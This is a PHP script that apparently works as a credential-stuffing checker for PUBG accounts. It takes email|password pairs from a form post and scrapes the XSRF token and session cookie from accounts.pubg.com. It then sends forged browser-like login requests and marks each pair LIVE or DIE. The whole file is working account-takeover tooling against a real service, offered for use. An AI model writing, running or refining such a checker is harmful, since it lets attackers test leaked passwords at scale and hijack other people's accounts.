<?php
error_reporting(0); 
date_default_timezone_set("Asia/Jakarta");
require 'agent.php';
require 'pubg_.php';
$format = $_POST['mailpass'];
$next = explode("|", $format);
$email = $next[0];
$pass = $next[1];
$a = get('https://accounts.pubg.com/login');
$token = cari($a,'XSRF-TOKEN=',';');
$sessionId = cari($a,'sessionId=',';');
if ($a) {
	$header = array(
		'Origin: https://accounts.pubg.com',
		'x-xsrf-token: '.$token.'',
		'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'Accept-Encoding: gzip, deflate, br',
		'Content-Type: application/json',
		'Accept: application/json, text/plain, */*',
		'user-agent: '.$browser.'',
		'cookie: _ga=GA1.2.545442120.1571862391; _gid=GA1.2.417291389.1571862391; _fbp=fb.1.1571862391945.1308624959; _gcl_au=1.1.2002066168.1571862396; _icl_current_language=id; sessionId='.$sessionId.'; XSRF-TOKEN='.$token.'',
		'Authority: accounts.pubg.com',
		'Referer: https://accounts.pubg.com/login',
	);
	$a = login('https://accounts.pubg.com/auth/local','{"email":"'.$email.'","password":"'.$pass.'"}',$header);
}
if (strpos($a, 'login.success')) {
	    die('{"error":0,"msg":"<font color=#318be3><b>LIVE</b></font> [<font color=#1ca8dd>Login</font></span>] | '.$email.' | '.$pass.' - [ <font color=#126e90>'.date("d/m/Y g:i A").'</font> ]./pubg"}');
}
else{
	die('{"error":2,"msg":"<font color=red><b>DIE</b></font> | '.$email.' | '.$pass.' - [ <font color=red>'.date("d/m/Y g:i A").'</font> ]./pubg"}');
}


?>